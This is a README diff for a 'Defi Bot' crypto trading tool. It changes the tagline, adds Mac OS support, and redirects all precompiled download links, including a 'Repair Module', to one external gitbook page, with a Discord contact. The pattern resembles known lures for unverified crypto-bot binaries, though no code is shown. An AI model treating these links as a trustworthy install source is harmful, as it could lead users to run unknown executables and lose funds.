@@ -3,10 +3,12 @@
 <p align="center"><img width="160" height="160" src="images/bitcoin.png" alt="Defi Bot logo" /></p>
 
 <h1 align="center">Defi Bot v3.1</h1>
-<p align="center"><b>Cryptocurrency trading bot</b></p>
+<p align="center"><b>Defi DEX trading bot</b></p>
 
 
 <p align="center"><img width="720" height="463" src="images/inter.jpg" alt="Defi Bot interface" /></p>
+
+> Work on Mac OS and Windows
 
 <p align="center">
   <a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a>
@@ -30,13 +32,15 @@
 
 2: Install Actual Precompile Release x32 / x64 👇
 
-Windows x64: [ ```Download``` ](https://github.com/manalap/defi-bot-selenium/releases/download/defi-bot-selenium/Selenium.Bot.Defi.Release.86-64.rar)
+Windows x64: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
-Windows x32: [ ```Download``` ](https://linkhere)
+Windows x32: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
-Windows MSI Package: [ ```Download``` ](https://linkhere)
+Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
-Windows Repair Module: [ ```Download``` ](https://linkhere)
+Windows Repair Module: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
+
+Mac OS [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
 
 Contact me on Discord: ```taaafeth```
